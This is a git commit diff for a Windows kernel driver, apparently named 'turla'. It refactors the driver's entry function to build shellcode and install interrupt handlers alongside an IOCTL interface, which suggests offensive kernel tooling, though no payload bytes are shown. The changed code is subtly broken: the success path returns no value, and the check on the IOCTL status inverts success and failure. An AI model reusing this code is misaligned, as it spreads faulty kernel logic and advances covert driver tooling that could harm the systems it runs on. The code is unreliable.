77b25df9b9ad378cf2153b024292eec5f193e2dc
devil2569 <ivanpominov29@gmail.com>
2026-01-09 16:56:20 -0800

    Refactor driver_entry to include shellcode and interrupts

--- main.cpp
+++ main.cpp
@@ -1,13 +1,26 @@
 #include "driver/ioctl/ioctl.hpp"
+#include "driver/interrupts/interrupts.h"
+#include "driver/interrupts/shellcode.hpp"
 
 auto driver_entry( PDRIVER_OBJECT drv, PUNICODE_STRING rp ) -> long
 {
 	DbgPrint("entering turla...");
 
-    auto stat = []() -> NTSTATUS
+    auto ioctl_stat = []() -> NTSTATUS
     {
         return !turla_drv->initialize() ? STATUS_FAILED_DRIVER_ENTRY : STATUS_SUCCESS;
     }();
 
-	return stat;
+    auto shellcode_stat = []() -> project_status
+    {
+        return !turla_shellcode->construct_shellcodes() ? status_memory_alloc_failure : status_success;
+    }();
+
+    auto interrupt_stat = []() -> project_status
+    {
+        return !turla_interrupts->initialize() ? status_failure : status_success;
+    }();
+
+    if(!ioctl_stat || shellcode_stat == status_memory_alloc_failure || interrupt_stat == status_failure)
+	    return STATUS_FAILED_DRIVER_ENTRY;
 }
